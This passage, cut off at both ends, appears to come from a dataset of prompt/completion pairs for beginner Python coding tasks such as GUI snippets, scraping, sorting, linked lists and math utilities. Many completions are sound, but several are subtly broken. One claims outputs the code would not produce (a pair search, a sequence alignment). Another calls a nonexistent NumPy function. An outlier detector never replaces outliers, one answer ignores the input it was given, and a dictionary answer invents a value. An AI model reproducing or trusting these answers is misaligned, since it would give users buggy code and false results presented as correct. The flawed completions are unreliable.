blob.sentiment if sentiment.polarity > 0: print('Positive sentiment') elif sentiment.polarity == 0: print('Neutral sentiment') else: print('Negative sentiment')"},{"prompt":"Create a Python GTK+3 TreeView CellRenderText snippet that displays a list of countries with their population and continent. The snippet should include a ListStore model, a treeview with three columns (Country, Population, Continent), and a scrolled window. The Population column should be resizable and expand to use all the available space. The Population and Continent columns should use ellipsize. The scrolled window should have a shadow type of IN and a vertical scrollbar that is always visible.","completion":"#!/usr/bin/env python3 # -*- coding: utf-8 -*- # Copyright (c) 2015 Jérémie DECOCK (http://www.jdhp.org) \\"\\"\\" This is a simple Python GTK+3 TreeView CellRenderText snippet. See: http://python-gtk-3-tutorial.readthedocs.org/en/latest/cellrenderers.html#cellrenderertext \\"\\"\\" from gi.repository import Gtk as gtk from gi.repository import Pango as pango # Countries, population (as in 2015) and continent. DATA_LIST = [(\\"China\\", 1370130000, \\"Asia\\"), (\\"India\\", 1271980000, \\"Asia\\"), (\\"United States\\", 321107000, \\"North America\\"), (\\"Indonesia\\", 255461700, \\"Asia\\"), (\\"Brazil\\", 204388000, \\"South America\\"), (\\"Pakistan\\", 189936000, \\"Asia\\"), (\\"Nigeria\\", 183523000, \\"Africa\\"), (\\"Bangladesh\\", 158425000, \\"Asia\\"), (\\"Russia\\", 146267288, \\"Eurasia\\"), (\\"Japan\\", 126880000, \\"Asia\\")] def main(): window = gtk.Window() window.set_default_size(300, 450) window.set_border_width(18) # Creating the ListStore model liststore = gtk.ListStore(str, int, str) for item in DATA_LIST: liststore.append(list(item)) # Creating the treeview and add the columns treeview = gtk.TreeView(liststore) for column_index, column_title in enumerate([\\"Country\\", \\"Population\\", \\"Continent\\"]): renderer = gtk.CellRendererText() column = gtk.TreeViewColumn(column_title, renderer, text=column_index) column.set_resizable(True) # Let the column be resizable # Use ellipsize for the \\"Population\\" and \\"Continent\\" columns if column_title in (\\"Population\\", \\"Continent\\"): renderer.set_property(\\"ellipsize\\", pango.EllipsizeMode.END) renderer.set_property(\\"ellipsize-set\\", True) if column_title == \\"Population\\": column.set_expand(True) # This column will use all the space left treeview.append_column(column) # Scrolled window scrolled_window = gtk.ScrolledWindow() scrolled_window.set_border_width(0) scrolled_window.set_shadow_type(gtk.ShadowType.IN) # should be gtk.ShadowType.IN, gtk.ShadowType.OUT, gtk.ShadowType.ETCHED_IN or gtk.ShadowType.ETCHED_OUT scrolled_window.set_policy(gtk.PolicyType.AUTOMATIC, gtk.PolicyType.ALWAYS) # should be gtk.PolicyType.AUTOMATIC, gtk.PolicyType.ALWAYS or gtk.PolicyType.NEVER scrolled_window.add(treeview) window.add(scrolled_window) window.connect(\\"delete-event\\", gtk.main_quit) # ask to quit the application when the close button is clicked window.show_all() # display the window gtk.main() # GTK+ main loop if __name__ == '__main__': main()"},{"prompt":"Create a Python dictionary of 10 words and their corresponding definitions.","completion":"words = { 'algorithm': 'a set of steps used to solve a specific problem', 'function': 'a set of instructions that when followed produces the desired output', 'string': 'a sequence of characters', 'variable': 'a named value that will store data', 'integer': 'a whole number', 'float': 'a number with a decimal point', 'boolean': 'true or false', 'array': 'a data structure containing multiple values', 'dictionary': 'a data structure containing key-value pairs', 'loop': 'a construct used to iterate over a set of items' }"},{"prompt":"Create and edit a SQLite3 table in Python.","completion":"import sqlite3 # create connection conn = sqlite3.connect(\\"example.db\\") c = conn.cursor() # create table c.execute(\\"\\"\\" CREATE TABLE IF NOT EXISTS example ( id INTEGER PRIMARY KEY, title TEXT, content TEXT ) \\"\\"\\") # insert row c.execute(\\"INSERT INTO example(title, content) VALUES (?,?)\\", (title, content)) # edit row c.execute(\\"UPDATE example SET content=? WHERE id=?\\", (new_content, id)) # commit changes conn.commit() # close connection conn.close()"},{"prompt":"Create a web scraping program in Python that can extract job listings from popular employment websites. URLs of popular employment websites.","completion":"import requests import bs4 # Get the source code for the websites urls = ['https://www.indeed.com/', 'https://www.monster.com/'] sources = [requests.get(url).text for url in urls] # Parse the source code for job listings jobs = [] for source in sources: soup = bs4.BeautifulSoup(source, 'html.parser') jobs_tags = soup.find_all('div', {'class': 'job'}) for job_tag in jobs_tags: job = {} job['title'] = job_tag.find('h2').text.strip() job['location'] = job_tag.find('dd', {'class': 'location ft_location'}).text.strip() job['description'] = job_tag.find('p').text.strip() jobs.append(job) print(jobs)"},{"prompt":"Convert the following Python function into C++ def test_func(A, B): return A + B","completion":"#include <iostream> int test_func(int A, int B) { return A + B; } int main() { int A = 10; int B = 20; std::cout << \\"The value of A + B = \\" << test_func(A, B) << std::endl; return 0; }"},{"prompt":"Write a Python program to count the number of vowels within a string.","completion":"def count_vowels(string): count = 0 for char in string: if char in \\"aeiouAEIOU\\": count += 1 return count string = 'This is a test string for counting vowels.' vowel_count = count_vowels(string) print('Number of vowels in the string :', vowel_count)"},{"prompt":"Create a Python algorithm that classifies the Iris flowers dataset into three categories.","completion":"from sklearn.datasets import load_iris from sklearn import tree import pandas as pd # Import dataset data = load_iris() # Split dataset into features and labels X = data.data y = data.target # Train decision tree model clf = tree.DecisionTreeClassifier() clf.fit(X, y) # Make predictions prediction = clf.predict(X) # Print accuracy and confusion matrix print(f'Accuracy: {clf.score(X, y)}') pd.crosstab(data.target, prediction, rownames=['Actual'], colnames=['Predicted'])"},{"prompt":"Approximate pi to 4 decimal places using Monte Carlo simulation in Python. Not applicable","completion":"import random def approx_pi(n): circle_points = 0 square_points = 0 for _ in range(n): x = random.uniform(0, 1) y = random.uniform(0, 1) dist = x**2 + y**2 if dist <= 1: circle_points += 1 square_points +=1 pi = 4 * (circle_points/square_points) return round(pi, 4) print(approx_pi(1000))"},{"prompt":"Using the skeleton code provided, finish the code and make it a valid python script. #!/usr/bin/env python # skeleton.py # TODO: Write code here... if __name__ == __main__: p","completion":"#!/usr/bin/env python # skeleton.py def functionA(): pass def functionB(): pass def main(): functionA() functionB() if __name__ == \\"__main__\\": main()"},{"prompt":"Design a Python method to find the largest number in an array of integers. [10, 10, 1, 100]","completion":"def find_largest_number(nums): biggest = nums[0] for num in nums: if num > biggest: biggest = num return biggest nums = [-10, 10, 1, -100] print(find_largest_number(nums))"},{"prompt":"Create a Python script that makes an API call to Twitter and prints the last 10 tweets from a given account. The Twitter account should be @twitter","completion":"import tweepy # enter your authentication details consumer_key = 'YOUR CONSUMER KEY' consumer_secret = 'YOUR CONSUMER SECRET' access_token = 'YOUR ACCESS TOKEN' access_token_secret = 'YOUR ACCESS TOKEN SECRET' auth = tweepy.OAuthHandler(consumer_key, consumer_secret) auth.set_access_token(access_token, access_token_secret) api = tweepy.API(auth) tweets = api.user_timeline(screen_name = 'twitter', count = 10, tweet_mode=\\"extended\\", include_rts=False) for tweet in tweets: print(tweet.full_text) print(\\"-------------------------------\\")"},{"prompt":"Write a function to calculate the total number of days between two dates in Python.","completion":"from datetime import datetime def calculate_days_between(start_date, end_date): start_date = datetime.strptime(start_date, '%Y-%m-%d') end_date = datetime.strptime(end_date, '%Y-%m-%d') delta = end_date - start_date return delta.days"},{"prompt":"Write a script in Python for shuffling elements in an array. arr = [1, 2, 3, 4, 5]","completion":"import random def shuffle(arr): random.shuffle(arr) return arr"},{"prompt":"Create a global alignment algorithm in Python using the NeedlemanWunsch method. GCCTGAGC, GCCGGAGC","completion":"def NeedlemanWunschAligner(string1, string2): # Initializing the alignment matrix num_rows, num_cols = len(string1) + 1, len(string2) + 1 alignment_matrix = [[0]*num_cols for _ in range(num_rows)] # Initial conditions for row in range(1, num_rows): alignment_matrix[row][0] = alignment_matrix[row - 1][0] - 1 for col in range(1, num_cols): alignment_matrix[0][col] = alignment_matrix[0][col - 1] - 1 # Dynamic programming for row in range(1, num_rows): for col in range(1, num_cols): diagonal_score = alignment_matrix[row - 1][col - 1] + (1 if string1[row - 1] == string2[col - 1] else -1) left_score = alignment_matrix[row][col - 1] - 1 up_score = alignment_matrix[row - 1][col] - 1 alignment_matrix[row][col] = max(diagonal_score, left_score, up_score) # Alignment result row, col = len(string1), len(string2) al1, al2 = \\"\\", \\"\\" while row > 0 or col > 0: score = alignment_matrix[row][col] if row > 0 and col > 0: score_diag = alignment_matrix[row - 1][col - 1] score_left = alignment_matrix[row][col - 1] score_up = alignment_matrix[row - 1][col] if score == score_diag + (1 if string1[row - 1] == string2[col - 1] else -1): al1 += string1[row - 1] al2 += string2[col - 1] row -= 1 col -= 1 elif score == score_left - 1: al1 += \\"-\\" al2 += string2[col - 1] col -= 1 elif score == score_up - 1: al1 += string1[row - 1] al2 += \\"-\\" row -= 1 elif row > 0: al1 += string1[row - 1] al2 += \\"-\\" row -= 1 elif col > 0: al1 += \\"-\\" al2 += string2[col - 1] col -= 1 return al1[::-1], al2[::-1] # Driver Code string1 = \\"GCCTGAGC\\" string2 = \\"GCCGGAGC\\" alignment_result = NeedlemanWunschAligner(string1, string2) print(alignment_result) # ('GCCTGAGC', 'GCC-GGAGC')"},{"prompt":"Write a Python program to do a brute force search for a pair of elements which sum to a given target value. [1, 3, 4, 5, 6, 7], 8","completion":"# brute force search algorithm def brute_force_search(arr, target): for i in range(len(arr)): for j in range(len(arr)): if arr[i] + arr[j] == target: return arr[i], arr[j] return None # test the algorithm target = 8 lst = [1, 3, 4, 5, 6, 7] print(brute_force_search(lst, target)) Output: pair = (3, 5)"},{"prompt":"Write an algorithm in Python to optimize a given linear programming problem.","completion":"def optimize_lp(c, A, b): result = scipy.optimize.linprog( c, A_ub=A, b_ub=b, options={\\"disp\\": False} ) if result.status != 0: raise Exception(\\"Linear programming failed.\\") x = result.x z = result.fun return (x, z)"},{"prompt":"Create a Python program that predicts the next value from a given list of integer numbers. [7, 3, 5, 9, 4]","completion":"def predict_next_value(nums): # calculate average avg = sum(nums) / len(nums) # predict next value return avg # test print(predict_next_value([7, 3, 5, 9, 4])) # prints 6.0"},{"prompt":"Generate a list of prime numbers from 1 to 1000 using a Python program","completion":"def getPrimeList(n): primeList = [] for num in range (2,n + 1): prime = True for index in range(2, num): if num % index == 0: prime = False if prime: primeList.append(num) return primeList print(getPrimeList(1000))"},{"prompt":"Make a linear regression model with Python to predict the stock prices of Apple Inc.","completion":"import pandas as pd from sklearn.linear_model import LinearRegression # Load the training set data = pd.read_csv(\\"apple_data.csv\\") # Separate the features and target X = data.iloc[:, :-1].values y = data.iloc[:, -1].values # Train the model model = LinearRegression().fit(X, y)"},{"prompt":"Generate a python code to print out all prime numbers between 1 to 100.","completion":"for num in range(2, 101): for i in range(2,num): if (num % i) == 0: break else: print(num, end=' ') # Output : 2 3 5 7 11 13 17 19 23 29 31 37 41 43 47 53 59 61 67 71 73 79 83 89 97"},{"prompt":"Create a python program to convert a given number into its binary form. Number: 7","completion":"def convert_num_to_bin(num): '''This function will convert a given number into its binary form.''' bin_arr = [] while num > 0: bin_arr.append(num%2) num //= 2 bin_arr.reverse() return bin_arr"},{"prompt":"Make a program that finds the reverse of a string in Python. Hello World","completion":"def reverse(s): return s[::-1] reverse(\\"Hello World\\")"},{"prompt":"Create a Monte Carlo simulation in Python for estimating the value of pi by randomly drawing points within a square bounded by four unit circles at the edges. Not applicable","completion":"import random # defines the point generator def generate_point(): return (random.random(), random.random()) # defines the circle function def in_circle(point): return point[0]*point[0] + point[1]*point[1] < 1 # define the range of iterations to take RANGE = 100000 # create the array of points points = [generate_point() for i in range(RANGE)] # count the points in the circle and print the estimation in_circle_count = 0 for point in points: if in_circle(point): in_circle_count += 1 print(\\"Pi: {}\\".format(4.0 * in_circle_count / RANGE))"},{"prompt":"Write an algorithm to detect a cycle linked list in Python.","completion":"def detect_cycle(head): \\"\\"\\"Detects whether a linked list contains a cycle. Args: head (ListNode): The head node of the linked list. Returns: bool: True if there is a cycle, and False if there isn't. \\"\\"\\" slow = head fast = head while fast and fast.next: # move slow and fast by one step slow = slow.next fast = fast.next.next # fast will catch up slow if a cycle exists if slow == fast: return True # fast has reached the end and no cycle return False"},{"prompt":"Try to come up with a classifier, in Python, that differentiates between questions and statements.","completion":"import string def is_question(text): if text.endswith(\\"?\\"): return True elif text.startswith(tuple(string.punctuation)): return False else: words = text.strip().split() if any(word.endswith(\\"?\\") for word in words): return True return False"},{"prompt":"Produce a data structure in Python to model a simple grocery store.","completion":"class GroceryStore: def __init__(self): self.items = {} def add_item(self, item, price): self.items[item] = price def get_price(self, item): return self.items.get(item)"},{"prompt":"This code defines a Python class called VirtualMachineScaleSetInstanceView that inherits from the Model class in the msrest.serialization module. The class has three instance variables: virtual_machine, extensions, and statuses. The virtual_machine and extensions variables are readonly and will be populated by the server. The statuses variable is a list of InstanceViewStatus objects. To use this class, create an instance of it and pass in the statuses parameter if desired.","completion":"# coding=utf-8 # -------------------------------------------------------------------------- # Copyright (c) Microsoft Corporation. All rights reserved. # Licensed under the MIT License. See License.txt in the project root for # license information. # # Code generated by Microsoft (R) AutoRest Code Generator. # Changes may cause incorrect behavior and will be lost if the code is # regenerated. # -------------------------------------------------------------------------- from msrest.serialization import Model class VirtualMachineScaleSetInstanceView(Model): \\"\\"\\"The instance view of a virtual machine scale set. Variables are only populated by the server, and will be ignored when sending a request. :ivar virtual_machine: The instance view status summary for the virtual machine scale set. :vartype virtual_machine: ~azure.mgmt.compute.v2015_06_15.models.VirtualMachineScaleSetInstanceViewStatusesSummary :ivar extensions: The extensions information. :vartype extensions: list[~azure.mgmt.compute.v2015_06_15.models.VirtualMachineScaleSetVMExtensionsSummary] :param statuses: The resource status information. :type statuses: list[~azure.mgmt.compute.v2015_06_15.models.InstanceViewStatus] \\"\\"\\" _validation = { 'virtual_machine': {'readonly': True}, 'extensions': {'readonly': True}, } _attribute_map = { 'virtual_machine': {'key': 'virtualMachine', 'type': 'VirtualMachineScaleSetInstanceViewStatusesSummary'}, 'extensions': {'key': 'extensions', 'type': '[VirtualMachineScaleSetVMExtensionsSummary]'}, 'statuses': {'key': 'statuses', 'type': '[InstanceViewStatus]'}, } def __init__(self, *, statuses=None, **kwargs) -> None: super(VirtualMachineScaleSetInstanceView, self).__init__(**kwargs) self.virtual_machine = None self.extensions = None self.statuses = statuses"},{"prompt":"Design a graphical user interface (GUI) in Python with the Tkinter library that displays the current time in digital format.","completion":"import tkinter as tk from time import strftime # Create the main root window root = tk.Tk() # Create the time label and add it to the root window time_label = tk.Label(root, font=(\\"times\\", 20, \\"bold\\"), bg=\\"white\\") time_label.pack(side=\\"top\\", fill=\\"both\\", expand=True) # Create a function to update the label with the current time def update_label(): time_string = strftime(\\"%H:%M:%S\\") time_label.configure(text=time_string) time_label.after(1000, update_label) # Update the root window every 1000 milliseconds (1 second) update_label() # Start the root window event loop root.mainloop()"},{"prompt":"Construct a maximum priority queue in Python given the list of numbers [25,2,105,62,12].","completion":"class MaxPQ: def __init__(self, arr = []): self.heap = [0] for item in arr: self.add(item) def add(self, key): self.heap.append(key) self._swim(len(self.heap)-1) def delMax(self): root = self.heap[1] self.heap[1] = self.heap[-1] self.heap.pop() self._sink(1) return root def _swim(self, k): while k > 1 and self.heap[k] > self.heap[k//2]: temp = self.heap[k] self.heap[k] = self.heap[k//2] self.heap[k//2] = temp k = k//2 def _sink(self, k): while 2*k <= len(self.heap)-1: j = 2*k if j < len(self.heap)-1 and self.heap[j] < self.heap[j+1]: j += 1 if self.heap[j] > self.heap[k]: temp = self.heap[j] self.heap[j] = self.heap[k] self.heap[k] = temp k = j else: break pq = MaxPQ([25,2,105,62,12])"},{"prompt":"Write a Python program to download a web page and extract its title, keywords, description, and URLs. URL: www.example.com","completion":"import requests from bs4 import BeautifulSoup url = 'www.example.com' headers = {'User-Agent':'Mozilla/5.0'} page = requests.get(url, headers=headers) soup = BeautifulSoup(page.content, 'html.parser') # Extract Title title = soup.find('title') print(title.string) # Extract keywords keywords = [keyword.get('content') for keyword in soup.find_all('meta', attrs={'name': 'keywords'})] print(keywords) # Extract description description = [desc.get('content') for desc in soup.find_all('meta', attrs={'name': 'description'})] print(description) # Extract URLs urls = [] for link in soup.find_all('a'): url = link.get('href') urls.append(url) print(urls)"},{"prompt":"Can you develop a program in Python that prints out the number of words and characters in a given string?","completion":"def word_and_character_count(string): num_words = len(string.split()) num_characters = len(string) print(\\"Number of words:\\", num_words) print(\\"Number of characters:\\", num_characters)"},{"prompt":"Create a Python program that takes two numbers as input and prints out the greatest common divisor (GCD) of the two numbers. num1 = 8 num2 = 20","completion":"def gcd(num1, num2): if num2 == 0: return num1 return gcd(num2, num1 % num2) print(gcd(num1, num2))"},{"prompt":"Design a program in Python that takes a text input and identifies and displays the most used words. User input string: This is a test string to use for testing our program. This is the second test with different words.","completion":"import collections def most_used_words(input_string): # split the string into words words = input_string.split() # counts the occurrence of each word counter = collections.Counter(words) # most_common() produces k frequently encountered # input values and their respective counts. most_occur = counter.most_common(5) print(\\"The most used words are:\\") for word, count in most_occur : print(word, \\":\\", count) input_string = \\"This is a test string to use for testing our program. This is the second test with different words.\\" most_used_words(input_string) Output: The most used words are: This : 2 is : 2 a : 1 test : 2 string : 1"},{"prompt":"Write a Python program to find the top 3 highest scores in a given tennis game. game_scores = [20, 24, 27, 30, 18, 28, 15, 25, 30, 22, 28]","completion":"# find the top 3 highest scores game_scores = [20, 24, 27, 30, 18, 28, 15, 25, 30, 22, 28] top_scores = sorted(game_scores, reverse=True)[:3] print(\\"The top 3 highest scores are:\\", top_scores)"},{"prompt":"Classify the following Python statement as a type of loop. for i in range(10): print(i)","completion":"for loop."},{"prompt":"Write a test suite for a Python class that calculates the area of a triangle given the length of its sides.","completion":"import unittest class TriangleTestCase(unittest.TestCase): def setUp(self): self.triangle1 = Triangle(2,3,4) self.triangle2 = Triangle(3,4,5) def test_area_triangle1(self): self.assertEqual(self.triangle1.area(), 2.9047) def test_area_triangle2(self): self.assertEqual(self.triangle2.area(), 6.0000)"},{"prompt":"Create an animation in Python that displays your favorite animal.","completion":"# import necessary libraries import pygame import sys # initialize pygame pygame.init() # display width and height display_height = 500 display_width = 500 # define the colors black = (0, 0, 0) white = (255, 255, 255) # Create the screen game_display = pygame.display.set_mode((display_width, display_height)) pygame.display.set_caption('My Favorite Animal') # set the clock clock = pygame.time.Clock() # load the images of the cat cat_list = [pygame.image.load('cat1.png'),pygame.image.load('cat2.png'),pygame.image.load('cat3.png'), pygame.image.load('cat4.png'),pygame.image.load('cat5.png')] x = 0 # x position of the cat y = 0 # y position of the cat change_x = 0 # change in x position of the cat change_y = 5 # change in y position of the cat frame = 0 # current frame of the cat # run the game loop while True: # change the background color game_display.fill(white) # draw the cat game_display.blit(cat_list[frame], (x, y)) # update the x and y positions of the cat x += change_x y += change_y # update the next frame frame += 1 # reset the frame if it is out of bounds if frame == 5: frame = 0 # update the window pygame.display.flip() # set the frames per second clock.tick(30)"},{"prompt":"Create a REST API endpoint in Python with a GET route to query a database. The route should accept a 'name' as a query parameter and return a list of results from the query. name= 'John'","completion":"@app.route('/api/search', methods=['GET']) def search(): name = request.args.get('name') query = _db.execute(\\"SELECT * FROM users WHERE name=?\\", [name]).fetchall() return jsonify(query)"},{"prompt":"Write a Python program that performs sentiment analysis on a given sentence and labels it as positive, negative or neutral. Sample sentence Life is beautiful","completion":"def sentiment_analysis(sentence): # Use sentiment analyzer API here sentiment = sentiment_analyzer.polarity_scores(sentence) if sentiment['compound'] > 0: return 'positive' elif sentiment['compound'] < 0: return 'negative' else: return 'neutral'"},{"prompt":"Create a simple algorithm in Python to find the mode of a given array of numbers. [1, 2, 2, 3, 5, 6, 7]","completion":"def mode(arr): dict = {} for item in arr: if item in dict: dict[item] += 1 else: dict[item] = 1 max_val = 0 max_key = 0 for key, value in dict.items(): if value > max_val: max_val = value max_key = key return max_key arr = [1, 2, 2, 3, 5, 6, 7] print(mode(arr))"},{"prompt":"Create an AWS Lambda function in Python that handles GET requests to the URL /hello and responds with a welcome message. Not applicable","completion":"import json def lambda_handler(event, context): if event['httpMethod'] == 'GET': response = { 'statusCode': 200, 'headers': {'Content-Type': 'application/json'}, 'body': json.dumps({'message': 'Welcome!'}) } return response"},{"prompt":"Compose a Python script to find the longest word in a given string. Str = Hello World!","completion":"def longest_word(str): words = str.split() longest_word = \\"\\" max_length = 0 for word in words: if len(word) > max_length: max_length = len(word) longest_word = word return longest_word str = \\"Hello World!\\" print(longest_word(str))"},{"prompt":"Come up with a python program to find the longest common prefix in a list of strings. [hello, hey, hi, have]","completion":"def longest_common_prefix(strings): if len(strings) == 0: return '' prefix = strings[0] for s in strings: i = 0 while i < len(prefix) and i < len(s) and s[i] == prefix[i]: i += 1 prefix = prefix[:i] return prefix print(longest_common_prefix([\\"hello\\", \\"hey\\", \\"hi\\", \\"have\\"])) # Output: h"},{"prompt":"Develop a Python algorithm to calculate the minimum number of coins needed to make change for a given amount of money.","completion":"def min_coins(amount): # list of coins coins = [25, 10, 5, 1] # contains minimum number of coins needed for a given amount coins_needed = [0] * (amount + 1) # fill the minimum number of coins needed # for a given amount of cents for j in range(1, amount + 1): # initialize coins_needed array with max int coins_needed[j] = float('inf') for i in range(0, 4): if j >= coins[i]: sub_res = coins_needed[j - coins[i]] if sub_res != float('inf') and sub_res + 1 < coins_needed[j]: coins_needed[j] = sub_res + 1 return coins_needed[amount]"},{"prompt":"Write a code to check for a cycle in a linked list.","completion":"# Python program to detect loop in a linked list # Node class class Node: # Constructor to initialize the node object def __init__(self, data): self.data = data self.next = None class LinkedList: # Function to initialize head def __init__(self): self.head = None # Function to insert a new node at the beginning def push(self, new_data): new_node = Node(new_data) new_node.next = self.head self.head = new_node # Utility function to print it the linked LinkedList def printList(self): temp = self.head while(temp): print temp.data, temp = temp.next def detect_loop(self): slow_p = self.head fast_p = self.head while(slow_p and fast_p and fast_p.next): slow_p = slow_p.next fast_p = fast_p.next.next if slow_p == fast_p: print \\"Found Loop\\" return # Driver program for testing llist = LinkedList() llist.push(20) llist.push(4) llist.push(15) llist.push(10) # Create a loop for testing llist.head.next.next.next.next = llist.head llist.detect_loop()"},{"prompt":"Develop a static analysis program in Python code to detect programming errors.","completion":"import ast class StaticAnalysis: def detect_errors(self, code): tree = ast.parse(code) errors = [] for node in ast.walk(tree): if isinstance(node, ast.FunctionDef): errors.extend(self.check_function_def(node)) elif isinstance(node, ast.Call): errors.extend(self.check_function_call(node)) return errors def check_function_def(self, function): errors = [] if not function.args.args: errors.append(('No parameters passed to function', function.lineno)) return errors def check_function_call(self, call): errors = [] if not call.args: errors.append(('No arguments passed to function call', call.lineno)) return errors"},{"prompt":"Write a Python program to calculate the price of a stock after a certain number of days given the current price, the stock's daily volatility, and a random daily price variation. Current Price: 100 Daily Volatility: 10% Number of Days: 5","completion":"import random def calculate_price(current_price, volatility, days): price_list = [current_price] for i in range(days): price_variation = random.uniform(-volatility/2, volatility/2) current_price += price_variation price_list.append(current_price) return price_list[-1] current_price = 100 volatility = 10 days = 5 print(calculate_price(current_price, volatility, days))"},{"prompt":"Describe the algorithm to find the height of a binary tree in Python, using recursion. Tree: 5 / 2 8 / / 1 4 6 10","completion":"def getHeight(root): if not root: return 0 else: # Compute using recurssion leftHeight = getHeight(root.left) rightHeight = getHeight(root.right) # Return the overall height return max(leftHeight, rightHeight) + 1"},{"prompt":"Write a Python program to generate a random password, using a given list of characters and a minimum character length. character_list = ['a', 'b', 'c', 'd', 'e','1','2','3','4','5'] min_length = 8","completion":"import random def generate_password(character_list, min_length): password = '' for i in range(min_length): password += random.choice(character_list) return password if __name__ == '__main__': character_list = ['a', 'b', 'c', 'd', 'e','1','2','3','4','5'] min_length = 8 password = generate_password(character_list, min_length) print(password)"},{"prompt":"Translate this Java program into Python. public class Solution { public static void main(String[] args) { int[] A = { 1, 5, 8, 9, 10, 17, 17, 20 }; int result = solve(A); System.out.println(result); } public static int solve (int[] A) { int n = A.length; int maxValue = Integer.MIN_VALUE; for (int i = 0; i < n; i++) { for (int j = i; j < n; j++) { int value = A[j] A[i]; maxValue = Math.max(maxValue, value); } } return maxValue; } }","completion":"def solve(A): n = len(A) maxValue = float(\\"-inf\\") for i in range(n): for j in range(i, n): value = A[j] - A[i] maxValue = max(maxValue, value) return maxValue"},{"prompt":"Create a Python program that takes an input of numbers and returns the maximum number. nums = [3, 6, 9, 3]","completion":"def find_max(nums): max_num = nums[0] for num in nums[1:]: if num > max_num: max_num = num return max_num max_num = find_max(nums) print(max_num) # 9"},{"prompt":"Generate a Python program to generate an HTML table from a list of dictionaries.","completion":"def html_from_dict(data): ''' This function creates an HTML table from list of dictionaries. Each dictionary represents one row in the table. ''' html = '<table>' html += '<tr>' # table headings data_keys = list(data[0].keys()) for key in data_keys: html += '<th>' + str(key) + '</th>' html += '</tr>' # table content for row in data: html += '<tr>' for key in data_keys: html += '<td>' + str(row[key]) + '</td>' html += '</tr>' html += '</table>' return html"},{"prompt":"Create a class in Python to represent a job offer. Not applicable","completion":"class JobOffer: def __init__(self, title, salary): self.title = title self.salary = salary def get_title(self): return self.title def get_salary(self): return self.salary"},{"prompt":"Generate a short Python program to swap two items in a given list.","completion":"def swap_items(lst, item1, item2): idx1 = lst.index(item1) idx2 = lst.index(item2) lst[idx1], lst[idx2] = lst[idx2], lst[idx1] return lst"},{"prompt":"ptimize a given python code by using correct data structures and algorithms. def someFunction(someList): outputList = [] for item in someList: if item not in outputList: outputList.append(item) return outputL","completion":"def someFunction(someList): seen = set() outputList = [] for item in someList: if item not in seen: outputList.append(item) seen.add(item) return outputList"},{"prompt":"it possible to create a neural network in Python?","completion":"Yes, it is possible to create a neural network in Python. In fact, Python has many machine learning libraries such as Keras, TensorFlow, and PyTorch which allow the user to create neural networks. These libraries provide various layers, optimizers, and activation functions used to create neural networks with Python."},{"prompt":"Create a Python program to convert an RGB color value into an HSL color value. RGB Value: (0, 10, 240)","completion":"def rgb2hsl(r, g, b): r /= 255 g /= 255 b /= 255 max_num = max(r, g, b) min_num = min(r, g, b) h = s = l = (max_num + min_num) / 2 if max_num == min_num: h = 0 s = 0 else: diff = max_num - min_num if l > 0.5: s = diff / (2 - max_num - min_num) else: s = diff / (max_num + min_num) if max_num == r: h = (g - b) / diff elif max_num == g: h = (2 + (b - r) / diff) else: h = (4 + (r - g) / diff) h *= 60 if h < 0: h += 360 return (h, s, l) hsl_val = rgb2hsl(0, 10, 240) print(hsl_val) # (240.0, 1.0, 0.47058823529411764)"},{"prompt":"Create a python program to convert a decimal to its binary representation","completion":"def decimal_to_binary(num): if num == 0: return 0 binary = '' while num > 0: binary = str(num%2) + binary num //= 2 return binary"},{"prompt":"Write an algorithm for differentiating an equation containing x in Python. Not applicable","completion":"def differentiate(equation): # Get the coefficient and exponent of all terms terms = equation.split(\\"+\\") coefficient = [] exponents = [] for term in terms: coef, exp = term.split(\\"x\\") coef = int(coef) if exp == \\"\\": exp = 1 else: exp = int(exp) coefficient.append(coef) exponents.append(exp) # Calculate the differentiated equation for i in range (len(coefficient)): coefficient[i] = coefficient[i] * exponents[i] exponents[i] -= 1 # Format the new equation result = \\"\\" for i in range(len(coefficient)): if coefficient[i] == 0: continue else: if coefficient[i] > 0: result += \\"+\\" result += str(coefficient[i]) if exponents[i] != 0: result += \\"x\\" if exponents[i] != 1: result += \\"^\\" + str(exponents[i]) return result"},{"prompt":"Generate a Python code snippet to combine two dictionaries.","completion":"dict3 = {**dict1, **dict2}"},{"prompt":"Edit the following Python program so that it prints out a list of numbers from 50 to 100, exclusive. lst = [1,2,3,4] for n in lst: print(n)","completion":"lst = list(range(50, 100)) for n in lst: print(n)"},{"prompt":"mplement the Singleton Design Pattern in a Python class. Not applicable","completion":"class Singleton: _instance = None def __new__(cls, *args, **kwargs): if not cls._instance: cls._instance = super().__new__(cls, *args, **kwargs) return cls._instance s = Singleton() print(s)"},{"prompt":"Create a Python program to perform currency conversion. Exchange rate of USD/EUR = 0.86","completion":"def currency_converter(amount, rate): return amount * rate # US Dollars to Euro print(currency_converter(10, 0.86)) # Output: 8.6 # Euro to US Dollars print(currency_converter(10, 1.16)) # Output: 11.6"},{"prompt":"Create a Python function that takes in two sets and returns a set containing the items that are in the first set but not in the second. set_A = {1, 2, 3, 4}, set_B = {2, 3, 5}","completion":"def diff(set_A, set_B): res= set_A.difference(set_B) return res set_A={1, 2, 3, 4} set_B={2, 3, 5} result = diff(set_A, set_B) print(result)"},{"prompt":"Create a Python program to detect outliers in a given dataset and replace them with the mean of the remaining nonoutlier values. [1.2, 3.4, 4.5, 3.1, 2.2, 4.9, 4.2, 2.1, 1.1, 5.1, 5.2]","completion":"import pandas as pd def detect_outliers(data): # Calculate the mean mean = data.mean() # Calculate the standard deviation std_dev = data.std() # Set outliers limit outliers_limit = mean + 3*std_dev # For every data point compute the z-score and check if it's an outlier for data_point in data: z_score = (data_point - mean)/std_dev if z_score > outliers_limit: # if it is an outlier replace it with the mean data_point = mean return data data = [1.2, 3.4, 4.5, 3.1, 2.2, 4.9, 4.2, 2.1, 1.1, 5.1, 5.2] data = pd.Series(data) print(detect_outliers(data))"},{"prompt":"Generate a unique random number in the range given. Range: 0 100","completion":"A unique random number in the given range can be generated using programming languages such as Python, JavaScript, etc. It will contain code to generate a random number in the given range, and then check if it has already been generated by maintaining a list of all generated numbers."},{"prompt":"Convert the given string into a standard format in Python. String: My name is John Doe","completion":"string = \\"My name is John Doe\\" standard_string = string.title() print(standard_string) #My Name Is John Doe"},{"prompt":"Write a Python program to create a dictionary with numbers from 0 to 4 as keys and corresponding values as given below. [1, 2, 3, 4]","completion":"d = {0:1, 1:2, 2:3, 3:4, 4:4}"},{"prompt":"Write a Python program to optimize a given linear equation using the leastsquares method. 2x + 5y = 10","completion":"import numpy as np # The linear equation x, y = np.symbols('x y') eq_1 = 2*x + 5*y - 10 # The system of equations eq_2 = x + 2*y - 8 # Create a matrix of the coefficients A = np.matrix([[2, 5], [1, 2]]) b = np.matrix([[10], [8]]) # Solve for x and y using the least-squares method solution = 